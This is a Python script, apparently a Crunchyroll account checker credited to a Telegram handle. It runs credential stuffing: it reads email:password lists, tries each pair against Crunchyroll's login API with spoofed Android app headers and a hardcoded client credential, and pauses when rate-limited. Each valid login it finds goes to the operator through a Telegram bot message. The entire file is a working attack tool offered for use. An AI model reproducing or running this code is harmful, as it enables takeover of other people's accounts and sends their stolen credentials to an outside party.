import requests,random
from concurrent.futures import ThreadPoolExecutor
import concurrent,os,pyfiglet,time
from user_agent import generate_user_agent

# ------------------------------[الالوان]------------------------------
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
# ------------------------------[الالوان]------------------------------

device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))

print(B)
print(str(pyfiglet.figlet_format(' '*21+"TOKEN")) + f"{S}                         Tele ==> @HenrryOfc</>\n")
print(f"{F}━"*77)
tok = input(f' {A} —{Z} TOKEN {F}BOT {X}: ')
os.system('clear')


print()
print(str(pyfiglet.figlet_format(' '*32+"ID")) + f"{S}                         Tele ==> @HenrryOfc </>\n")
print(f"{F}━"*77)
ID = input(f' {X} —{F} YOUR {Z}ID {A}: ')
os.system('clear')


print()
print(str(pyfiglet.figlet_format(' '*25+"FILE")) + f"{S}                         Tele ==> @HenrryOfc </>\n")
print(f"{F}━"*77)
file_name = input(f' {X} —{F} FILE {Z}PATH {A}: ')
print(f"{F}━"*77)
file = open(file_name).read().splitlines()


for xx in file:
	if ":" in xx:
		email = xx.split(':')[0]
		pasw = xx.split(':')[1]
		
		url = "https://beta-api.crunchyroll.com/auth/v1/token" 
		
		headers = {
			"host": "beta-api.crunchyroll.com" ,
		   "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=" ,
		   "x-datadog-sampling-priority": "0",
		   "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1", 
		   "content-type": "application/x-www-form-urlencoded",
		   "accept-encoding": "gzip",
		   "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0" 
		}
		
		data = {
		                "username": email,
		                "password": pasw,
		                "grant_type": "password",
		                "scope": "offline_access",
		                "device_id": device_id,
		                "device_name": "SM-G9810",
		                "device_type": "samsung SM-G955N"
		            }
		
		res = requests.post(url,data=data,headers=headers)
		
		
		if "refresh_token" in res.text:
			print(f'{F} 𝘨𝘰𝘰𝘥 ☑️  >>>> [ {email} | {pasw} ]')
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=Crunchyroll+Hit\n- - - - - - - - - -\n┌ Correo+⇝+{email}\n├ Contraseña+⇝{pasw}\n- - - - - - - - - -\n└ By+⇝+@HenrryOfc')
		
		elif "406 Not Acceptable" in res.text:
			print( "\n\n" +res.text+"\n\n")
			print(' Wait 5min ❗')
			time.sleep(360)
			
		else:
			print(f'{Z} 𝘦𝘳𝘳𝘰𝘳 ❌ >>>> [ {email} | {pasw} ]')
			time.sleep(6)
